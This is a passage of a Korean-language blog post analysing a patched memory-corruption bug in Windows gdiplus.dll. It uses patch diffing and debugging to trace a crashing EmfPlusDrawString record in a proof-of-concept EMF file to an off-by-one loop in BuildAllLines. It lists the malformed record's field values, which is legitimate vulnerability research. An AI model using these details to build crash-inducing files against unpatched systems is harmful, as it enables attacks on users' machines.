&#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Patch-Diffing-to-See-If-We-Can-Find-the-Root-Cause"><a href="#Patch-Diffing-to-See-If-We-Can-Find-the-Root-Cause" class="headerlink" title="Patch Diffing to See If We Can Find the Root Cause"></a>Patch Diffing to See If We Can Find the Root Cause</h1><p>Root cause&#xB97C; &#xD30C;&#xC545;&#xD558;&#xAE30; &#xC704;&#xD574; IDA BinDiff &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD328;&#xCE58; &#xD30C;&#xC77C;&#xC758; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC744; &#xC2DD;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B4;&#xC774; &#xC88B;&#xB2E4;&#xBA74; &#xBCC0;&#xACBD;&#xB41C; &#xCF54;&#xB4DC;&#xB9CC; &#xBD10;&#xB3C4; &#xC6D0;&#xC778;&#xC744; &#xC27D;&#xAC8C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; gdiplus.dll &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xACFC; &#xD328;&#xCE58;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBC84;&#xC804;&#xC758; IDB &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD55C; &#xB2E4;&#xC74C; IDA BinDiff &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xBCC0;&#xACBD; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD328;&#xCE58;&#xAC00; &#xC801;&#xC6A9;&#xB41C; &#xD30C;&#xC77C;&#xC5D0; &#xC0C8;&#xB85C;&#xC6B4; &#xAE30;&#xB2A5;&#xC774; &#xD558;&#xB098; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC73C;&#xBA70; &#xC774;&#xB294; BuildLine Object&#xC758; &#xC18C;&#xBA78;&#xC790;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/5.png" alt></p><p>&#xBA87;&#xBA87; &#xD568;&#xC218;&#xB4E4;&#xC758; &#xC720;&#xC0AC;&#xC131; &#xC810;&#xC218;&#xAC00; &lt; 1 &#xC778;&#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xACE0; &#xADF8;&#xC911;&#xD558;&#xB098;&#xAC00; &#xBC14;&#xB85C; FullTextImager::BuildAllLines &#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/6.png" alt></p><p>&#xC774;&#xC81C; &#xC774; &#xD568;&#xC218;&#xAC00; &#xD328;&#xCE58;&#xB41C; &#xD568;&#xC218;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574; windbg&#xC5D0;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xACFC; POC&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xC774; &#xD568;&#xC218;&#xC5D0; &#xB300;&#xD55C; break point&#xB97C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. break point&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xBA74; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xB354;&#xC774;&#xC0C1; crash&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/7.png" alt></p><p>&#xB2E4;&#xC74C;&#xC73C;&#xB85C; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBCF4;&#xC644;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBCC0;&#xACBD;&#xB41C; &#xD568;&#xC218;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xB294; &#xD568;&#xC218;&#xC758; &#xD750;&#xB984; &#xADF8;&#xB798;&#xD504;&#xB97C; &#xD655;&#xC778;&#xD574; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC548;&#xD0C0;&#xAE5D;&#xAC8C;&#xB3C4; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC774; &#xB108;&#xBB34; &#xB9CE;&#xC544; &#xCC28;&#xC774;&#xC810;&#xB9CC; &#xBCF4;&#xACE0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC2DD;&#xBCC4;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/8.png" alt></p><p>&#xC67C;&#xCABD;&#xC740; &#xD328;&#xCE58;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBC84;&#xC804;, &#xC624;&#xB978;&#xCABD;&#xC740; &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xC758; dll&#xC785;&#xB2C8;&#xB2E4;.</p><ul><li>&#xB179;&#xC0C9;&#xC740; &#xD328;&#xCE58;&#xB41C; &#xBE14;&#xB85D;&#xACFC; &#xD328;&#xCE58;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBE14;&#xB85D;&#xC774; &#xB3D9;&#xC77C;&#xD568;&#xC744; &#xB73B;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xB178;&#xB780;&#xC0C9; &#xBE14;&#xB85D;&#xC740; &#xB450; &#xBC84;&#xC804; &#xC0AC;&#xC774;&#xC5D0; &#xC0AC;&#xC18C;&#xD55C; &#xBCC0;&#xACBD;&#xC810;&#xC774; &#xC788;&#xC744;&#xC744; &#xB73B;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xBE68;&#xAC04; &#xBE14;&#xB85D;&#xC740; dll &#xAC04;&#xC5D0; &#xCC28;&#xC774;&#xC810;&#xC744; &#xB73B;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p>&#xB178;&#xB780;&#xC0C9; &#xBE14;&#xB85D;&#xC744; &#xC880;&#xB354; &#xC790;&#xC138;&#xD788; &#xB4E4;&#xC5EC;&#xB2E4; &#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/9.png" alt></p><p>&#xBA87; &#xAC00;&#xC9C0; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD328;&#xCE58;&#xB41C; DLL&#xC5D0;&#xC11C; &#xC77C;&#xBD80; &#xBE14;&#xB85D;&#xC774; &#xC81C;&#xAC70; &#xB418;&#xC5C8;&#xC73C;&#xBBC0;&#xB85C; patch diffing&#xB9CC;&#xC73C;&#xB85C;&#xB294; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; root cause&#xB97C; &#xC2DD;&#xBCC4;&#xD558;&#xAE30;&#xC5D0; &#xCDA9;&#xBD84;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; windbg&#xC640; &#xAC19;&#xC740; &#xB2E4;&#xB978; &#xB514;&#xBC84;&#xAE45; &#xBC29;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xC5B4;&#xB514;&#xC5D0;&#xC11C; &#xBB34;&#xC5C7;&#xC744; &#xCC3E;&#xC544;&#xC57C; &#xD558;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xADC0;&#xC911;&#xD55C; &#xD78C;&#xD2B8;&#xB97C; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xC704;&#xC758; BinDiff &#xCD9C;&#xB825;&#xC5D0;&#xC11C; &#xBA87; &#xAC00;&#xC9C0; &#xAD00;&#xCC30; &#xACB0;&#xACFC;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xD328;&#xCE58;&#xB418;&#xC9C0; &#xC54A;&#xC740; DLL&#xC5D0;&#xC11C; &#xC8FC;&#xC758; &#xAE4A;&#xAC8C; &#xD655;&#xC778;&#xD558;&#xBA74; &#x201C;GetuntrimmedCharacterCount&#x201D; &#xD568;&#xC218;&#xC5D0; &#xB300;&#xD55C; &#xD638;&#xCD9C;&#xC774; &#xC788;&#xACE0; &#xB098;&#xC911;&#xC5D0; &#x201C;SetSpan::SpanVector&#x201D;&#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xD328;&#xCE58;&#xB41C; DLL&#xC5D0;&#xC11C; EAX &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xB0B4;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xBC18;&#xD658; &#xAC12;&#xC744; &#xBCF4;&#xBA74; &#x201C;GetuntrimmedCharacterCount&#x201D; &#xD638;&#xCD9C;&#xC774; &#xC788;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. 0&#xC774;&#xBA74; &#xCEE8;&#xD2B8;&#xB864;&#xC774; &#xB2E4;&#xB978; &#xC704;&#xCE58;(BuiltLine Object&#xC758; &#xC18C;&#xBA78;&#xC790;)&#xB85C; &#xC810;&#xD504;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xCF54;&#xB4DC;&#xB294; &#xD328;&#xCE58;&#xB41C; DLL&#xC5D0; &#xC0C8;&#xB85C; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p><img src="/2021/09/05/fabu1ous/gdi/10.png" alt></p><p>&#xB530;&#xB77C;&#xC11C; &#xC5EC;&#xAE30;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD574;&#xACB0;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xB2E4;&#xC74C; &#xC0AC;&#xD56D;&#xB4E4;&#xC744; &#xD30C;&#xC545;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC81C;&#xACF5;&#xB41C; POC &#xD30C;&#xC77C;&#xACFC; &#xD568;&#xAED8; &#xC6B0;&#xB9AC; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC911;&#xB2E8;&#xB418;&#xB294; &#xC774;&#xC720;&#xB294; &#xBB54;&#xAC00;?</li><li>&#xD30C;&#xC77C;&#xC758; &#xC5B4;&#xB5A4; &#xD544;&#xB4DC;&#xC5D0; &#xC758;&#xD574; crash&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xAC00;?</li><li>&#xD544;&#xB4DC;&#xC758; &#xAC12;&#xC774; &#xBB54;&#xAC00;?</li><li>&#xC774; crash&#xB97C; &#xC77C;&#xC73C;&#xD0A4;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC870;&#xAC74;&#xC740; &#xBB34;&#xC5C7;&#xC778;&#xAC00;?</li><li>&#xC5B4;&#xB5BB;&#xAC8C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBCF4;&#xC644;&#xB418;&#xC5C8;&#xB098;?</li></ol><h1 id="EMF-File-Format"><a href="#EMF-File-Format" class="headerlink" title="EMF File Format:"></a>EMF File Format:</h1><p>EMF&#xB294; &#xADF8;&#xB798;&#xD53D; &#xC774;&#xBBF8;&#xC9C0; &#xC7A5;&#xCE58;&#xB97C; &#xB3C5;&#xB9BD;&#xC801;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD5A5;&#xC0C1;&#xB41C; &#xBA54;&#xD0C0; &#xD30C;&#xC77C; &#xD615;&#xC2DD;&#xC774;&#xB77C;&#xACE0;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;. EMF &#xD30C;&#xC77C;&#xC740; &#xAC00;&#xBCC0; &#xAE38;&#xC774;&#xC758; &#xB2E4;&#xC591;&#xD55C; &#xB808;&#xCF54;&#xB4DC;&#xB85C; &#xAD6C;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC5D0;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xADF8;&#xB798;&#xD53D; &#xAC1D;&#xCCB4;&#xC758; &#xC815;&#xC758;, &#xB3C4;&#xBA74; &#xBA85;&#xB839; &#xBC0F; &#xAE30;&#xD0C0; &#xADF8;&#xB798;&#xCE59; &#xD2B9;&#xC131;&#xC774; &#xD3EC;&#xD568;&#xB3C4;&#xB9AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/11.png" alt></p><p>&#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; EMF &#xD30C;&#xC77C;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xB808;&#xCF54;&#xB4DC;&#xB85C; &#xAD6C;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><ol><li>EMF &#xD5E4;&#xB354; - EMF &#xAD6C;&#xC870;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>EMF &#xB808;&#xCF54;&#xB4DC; - &#xADF8;&#xB798;&#xD53D; &#xD2B9;&#xC815;, &#xB3C4;&#xBA74; &#xC21C;&#xC11C; &#xB4F1;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xAC00;&#xBCC0; &#xAE38;&#xC774; &#xB808;&#xCF54;&#xB4DC;&#xC77C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>EMFEOF &#xB808;&#xCF54;&#xB4DC; - EMF &#xD30C;&#xC77C;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xB808;&#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</li><li>EMF &#xD30C;&#xC77C; &#xD615;&#xC2DD;&#xC758; &#xC790;&#xC138;&#xD55C; &#xC0AC;&#xC591;&#xC740; Microsoft &#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C; URL&#xC744; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-emf/91c257d7-c39d-4a36-9b1f-63e3f73d30ca">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-emf/91c257d7-c39d-4a36-9b1f-63e3f73d30ca</a></p><h1 id="Locating-the-Vulnerable-Record-in-the-EMF-File"><a href="#Locating-the-Vulnerable-Record-in-the-EMF-File" class="headerlink" title="Locating the Vulnerable Record in the EMF File:"></a>Locating the Vulnerable Record in the EMF File:</h1><p>&#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; EMF&#xC758; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xBB38;&#xC81C;&#xB294; &#xC798;&#xBABB;&#xB41C; &#xD615;&#xC2DD;&#xC758; &#xB808;&#xCF54;&#xB4DC;&#xB098; &#xC190;&#xC0C1;&#xB41C; &#xB808;&#xCF54;&#xB4DC; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xC5B4;&#xB5A4; &#xB808;&#xCF54;&#xB4DC; &#xD0C0;&#xC785;&#xC774; &#xC774; crash&#xB97C; &#xC77C;&#xC73C;&#xCF30;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xB0B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xD574; Call stack&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/12.png" alt></p><p>&#x201C;gdiplus!GdiPlayMetafileRecordCallback&#x201D;&#xC5D0; &#xB300;&#xD55C; &#xD638;&#xCD9C;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/13.png" alt></p><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0; break point&#xB97C; &#xAC78;&#xACE0; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xB97C; &#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC0AC;&#xC2E4;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/14.png" alt></p><p>EDX&#xC5D0; &#xC77C;&#xBD80; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70;, &#xC774; &#xAE30;&#xB2A5;&#xC5D0; &#xC9C0;&#xC815;&#xB41C; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xB294; 00x00401c,0x00000000, 0x00000044 &#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; EDX&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC704;&#xCE58;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/15.png" alt></p><p>POC EMF &#xD30C;&#xC77C;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC774; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD30C;&#xC77C;&#xC758; &#xC624;&#xD504;&#xC14B; 0x15c&#xC5D0; &#xC18D;&#xD568;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/16.png" alt></p><p>EMF &#xADDC;&#xACA9;&#xC744; &#xAC80;&#xD1A0;&#xD558;&#xACE0; &#xB808;&#xCF54;&#xB4DC;&#xB97C; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xC774; &#xB808;&#xCF54;&#xB4DC;&#xAC00; &#x201C;EmfPlusDrawString&#x201D; &#xB808;&#xCF54;&#xB4DC;&#xC784;&#xC744; &#xC27D;&#xAC8C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB808;&#xCF54;&#xB4DC;&#xC758; &#xD615;&#xC2DD;&#xC740; &#xB2E4;&#xBBD5;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/17.png" alt></p><p>&#xC6B0;&#xB9AC;&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB808;&#xCF54;&#xB4DC; &#xC720;&#xD615; = 0xeccEmfPlusDrawString &#xB808;&#xCF54;&#xB4DC;</p><p>flag = 0x0000</p><p>Size = 0x50</p><p>Data size = 0x44</p><p>Brushid = 0x02</p><p>Format id = 0x01</p><p>Length = 0x14</p><p>Layoutrect = 00 00 00 00 00 00 00 00 FC FF C7 42 00 00 80 FF</p><p>String data =</p><p><img src="/2021/09/05/fabu1ous/gdi/18.png" alt></p><p>&#xC774;&#xC81C; crash&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; &#xB808;&#xCF54;&#xB4DC;&#xB97C; &#xCC3E;&#xC558;&#xC73C;&#xB2C8;, &#xB2E4;&#xC74C; &#xBB38;&#xC81C;&#xB294; &#xC65C; &#xC6B0;&#xB9AC; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; crash&#xB098;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xB0B4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xCF54;&#xB4DC;&#xB97C; &#xB514;&#xBC84;&#xADF8; &#xD558;&#xACE0; &#xD559;&#xC778;&#xD558;&#xBA74; &#xCEE8;&#xD2B8;&#xB864;&#xC774; &#x201C;gdiplus!FullTextImager::BuildAlllines&#x201D;&#xC774; &#xB3C4;&#xB2EC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/19.png" alt></p><p>&#xB2E4;&#xC74C; &#xB2E4;&#xC774;&#xC5B4;&#xADF8;&#xB7A8;&#xC740; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC758; hierarchy&#xB97C; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/20.png" alt></p><h1 id="The-execution-flow-in-summary"><a href="#The-execution-flow-in-summary" class="headerlink" title="The execution flow in summary:"></a>The execution flow in summary:</h1><ol><li>&#x201C;Builtline::BuildAllLines&#x201D; &#xD568;&#xC218; &#xB0B4;&#xBD80;&#xC5D0; 0x60 &#xBC14;&#xC774;&#xD2B8;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xB294; &#xB8E8;&#xD504;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xB2E4;&#xC74C; &#x201C;Buildline::BuildLine&#x201D;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#x201C;Buildline::Buildline&#x201D;&#xC740; &#xC0C8;&#xB85C; &#xD560;&#xB2F9;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC62E;&#xAE30;&#xACE0; &#x201C;BuiltLine::GetUntrimmedCharacterCount&#x201D;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#x201C;BuiltLine::GetUntrimmedCharacterCount&#x201D;&#xC758; &#xB9AC;&#xD134; &#xAC12;&#xC740; &#xB8E8;&#xD504; &#xCE74;&#xC6B4;&#xD2B8;&#xB85C; ECX&#xC5D0; &#xD574;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xB8E8;&#xD504;&#xB294; &#xB3CC;&#xBA70; ECX&#xAC00; string length(EAX) == 0x14&#xAC00; &#xB420; &#xB54C;&#xAE4C;&#xC9C0; &#xBC18;&#xBCF5;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xB8E8;&#xD504; &#xCE74;&#xC6B4;&#xD2B8;&#xAC00; 0&#xC77C; &#xB54C; &#xC2DC;&#xC791;&#xD574; 0x13&#xC77C; &#xB54C; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;. &#xC989;, &#x201C;GetUntrimmedCharacterCount&#x201D;&#xAC00; 0&#xC77C; &#xB54C; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;.</li><li>DLL&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD574;&#xB2F9; &#xB8E8;&#xD504;&#xAC00; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC885;&#xB8CC;&#xB418;&#xC9C0; &#xC54A;&#xC544; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#x201C;BuiltLine::GetUntrimmedCharacterCount&#x201D;&#xAC00; 0&#xC744; &#xBC18;&#xD658;&#xD558;&#xACE0; &#xB8E8;&#xD504;&#xCE74;&#xC6B4;&#xD130;(ECX)&#xC5D0; &#xB354;&#xD574;&#xC9C0;&#xB294;&#xB370;, &#xC774;&#xB294; ECX&#xC758; &#xAC12;&#xC744; &#xC99D;&#xAC00;&#xC2DC;&#xD0A4;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. 0x60 &#xBC14;&#xC774;&#xD2B8;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC624;&#xC5FC;&#xC2DC;&#xCF1C; &#xB098;&#xC911;&#xC5D0; crash&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. 20&#xBC88; &#xB3CC;&#xC544;&#xC57C;&#xD560; &#xB8E8;&#xD504;&#xAC00; &#xCD1D; 21&#xBC88; &#xB3CC;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li></ol><h1 id="In-detail"><a href="#In-detail" class="headerlink" title="In detail:"></a>In detail:</h1><ol><li>&#x201C;Builtline::BuildAllLines&#x201D; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; 0x60(90) &#xBC14;&#xC774;&#xD2B8;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p><img src="/2021/09/05/fabu1ous/gdi/21.png" alt></p><ol><li>&#xADF8;&#xB7F0; &#xB2E4;&#xC74C; &#x201C;BuiltLine::BuiltLine&#x201D;&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xC0C8;&#xB85C; &#xD560;&#xB2F9;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC62E;&#xAE41;&#xB2C8;&#xB2E4;.</li></ol><p><img src="/2021/09/05/fabu1ous/gdi/22.png" alt></p><ol><li>&#xC774;&#xB294; while &#xB8E8;&#xD504; &#xC548;&#xC5D0; &#x201C;BuiltLine::GetUntrimmedCharacterCount&#x201D;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#x201C;BuiltLine::GetUntrimmedCharacterCount&#x201D;&#xC758; &#xBC18;&#xD658;&#xAC12;&#xC740; 0x12ff2ec&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. &#xC544;&#xB798; &#xC0AC;&#xC9C4;&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB4DC;&#xC2DC; &#xD574;&#xB2F9; &#xAC12;&#xC740; 1&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</li></ol><p><img src="/2021/09/05/fabu1ous/gdi/23.png" alt></p><ol><li>&#xD574;&#xB2F9; &#xAC12;&#xC740; ECX&#xC5D0; &#xB354;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</li></ol><p><img src="/2021/09/05/fabu1ous/gdi/24.png" alt></p><ol><li>ecx&#xAC00; eax&#xBCF4;&#xB2E4; &#xC791;&#xC740;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xCC38;&#xC774;&#xB77C;&#xBA74; &#xB8E8;&#xD504;&#xB97C; &#xBC18;&#xBCF5;&#xD558;&#xACE0;, &#xAC70;&#xC9D3;&#xC774;&#xB77C;&#xBA74; &#xB2E4;&#xB978; &#xC9C0;&#xC810;&#xC73C;&#xB85C; &#xC810;&#xD504;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p><img src="/2021/09/05/fabu1ous/gdi/25.png" alt></p><ol><li>&#xCDE8;&#xC57D;&#xC810; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#x201C;BuiltLine::GetUntrimmedCharacterCount&#x201D;&#xC758; &#xBC18;&#xD658;&#xAC12;&#xC774; 0&#xC77C; &#xB54C; &#xB8E8;&#xD504;&#xAC00; 